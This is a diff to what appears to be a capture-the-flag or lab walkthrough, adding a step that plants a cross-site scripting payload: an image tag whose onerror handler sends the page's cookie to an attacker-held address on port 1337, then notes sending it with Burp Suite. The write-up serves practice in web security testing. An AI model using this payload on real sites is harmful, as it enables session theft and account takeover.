@@ -144,8 +144,10 @@ Nmap done: 1 IP address (1 host up) scanned in 57.08 seconds
 
 9. Seems we still got the warning, lastly let's identify whether it only validate the `alert()` usage or not, let's set the onerror to steal the cookie and send it to our local python server.
 
-```
+```txt
 PAYLOAD:
 
-
+<img src=x onerror="this.src='http://10.10.16.64:1337/?'+document.cookie; this.removeAttribute('onerror');"> 
 ```
+
+10. Let's send it using burpsuite.
